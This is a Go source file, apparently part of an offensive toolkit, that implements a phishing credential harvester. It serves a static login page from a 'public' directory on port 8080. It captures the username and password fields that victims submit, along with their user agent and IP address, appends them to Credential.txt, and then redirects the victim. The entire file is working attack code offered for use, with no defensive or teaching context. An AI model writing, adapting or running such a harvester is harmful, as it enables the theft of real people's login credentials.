package gatherer

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

func login(w http.ResponseWriter, r *http.Request) {
	read1 := bufio.NewReader(os.Stdin)
	read2 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input Form username key:")
	username1, _, err1 := read1.ReadLine()
	fmt.Print("[*] input Form password key:")
	password, _, err2 := read2.ReadLine()
	if err1 != nil {
		panic(err1)
	}
	if err2 != nil {
		panic(err2)
	}
	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue(string(username1)),
		"password":   r.FormValue(string(password)),
		"user-agent": r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info("login attempt")
	http.Redirect(w, r, "/", http.StatusFound)
}

func Credential_Harvester() {
	fmt.Println("[*] begin Credential Harvester")
	fh, err := os.OpenFile("Credential.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer fh.Close()
	log.SetOutput(fh)
	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8080", r))
}
